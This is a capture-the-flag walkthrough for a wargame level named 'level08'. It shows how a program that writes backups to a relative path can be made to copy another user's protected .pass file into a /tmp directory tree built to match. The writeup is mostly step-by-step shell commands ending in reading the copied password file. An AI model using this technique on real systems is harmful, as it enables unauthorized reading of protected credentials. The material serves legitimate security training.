
# Level08 - Exploiting Relative Path Vulnerability to Access Protected File

## Objective

The goal of this challenge is to exploit a relative path vulnerability in the program to access a protected file.

## Step 1: Running the Program

First, let's run the program to observe its behavior:

```bash
$ ./level08
Usage: ./level08 filename
ERROR: Failed to open (null)
```

The program expects a filename as an argument.

## Step 2: Testing with a Target File

Try running the program with the file path of the target:

```bash
$ ./level08 ~level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```

The program attempts to open the file `./backups//home/users/level09/.pass` using a relative path.

## Step 3: Creating the Required Directory Structure

Since the program is using a relative path, we can exploit this by creating the necessary directory structure in a writable location like `/tmp`.

### Creating the Path in `/tmp`

Change to `/tmp` and create the required directory structure:

```bash
$ cd /tmp
$ mkdir -p ./backups//home/users/level09/
```

## Step 4: Running the Program from `/tmp`

Run the program from `/tmp` to match the expected path:

```bash
$ ~/level08 ~level09/.pass
```

## Step 5: Reading the Output File

After running the program, check the created file:

```bash
$ cat backups/home/users/level09/.pass
```

This approach demonstrates how the relative path vulnerability in the program can be exploited to gain unauthorized access to protected files by manipulating the working directory structure.
